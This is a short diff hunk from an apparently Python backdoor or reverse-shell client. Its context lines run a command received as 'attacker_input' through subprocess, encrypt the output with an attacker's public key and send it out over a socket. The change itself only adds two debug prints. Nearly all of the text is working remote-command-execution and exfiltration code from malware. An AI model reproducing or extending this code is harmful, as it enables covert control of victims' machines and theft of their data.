@@ -36,6 +36,8 @@ try:
             result = subprocess.run(attacker_input, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False)
             result = result.stdout.decode()
             print(f"result: {result}")
+            print(f"type(result): {type(result)}")
+            print(f"len(result): {len(result)}")
             encrypted_output = asymmetric_encryption.encrypt_message(result, attacker_pub_key)
             print(len(encrypted_output))
             s.send(encrypted_output)
